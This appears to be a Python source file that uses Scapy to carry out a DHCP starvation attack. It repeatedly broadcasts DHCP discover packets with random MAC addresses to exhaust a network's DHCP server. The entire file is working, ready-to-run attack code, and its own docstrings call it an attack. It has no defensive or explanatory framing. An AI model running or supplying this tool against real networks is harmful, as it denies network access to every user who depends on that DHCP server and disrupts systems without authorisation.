from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from threading import Thread

conf.checkIPaddr = False  # Disabling the IP address checking to prevent any IP conflicts


class DHCPStarvation:
    def __init__(self) -> None:
        """
        Object constractor
        """
        self.dst_mac = 'ff:ff:ff:ff:ff:ff'
        self.dst_ip = '255.255.255.255'
        self.src_ip = '0.0.0.0'

    def generate_discover_packet(self) -> Packet:
        """
        this function generates a packet that will be used to tire the dhcp server of the network.
        :return: packet
        """
        # Making an Ethernet packet
        return Ether(dst=self.dst_mac, src=RandMAC(), type=0x0800) / IP(src=self.src_ip, dst=self.dst_ip) / UDP(
            dport=67, sport=68) / BOOTP(op=1, chaddr=RandMAC()) / DHCP(options=[('message-type', 'discover'), 'end'])

    def start(self) -> None:
        """
        this function starts executes the attack.
        :return: None
        """
        sendp(self.generate_discover_packet(), loop=1)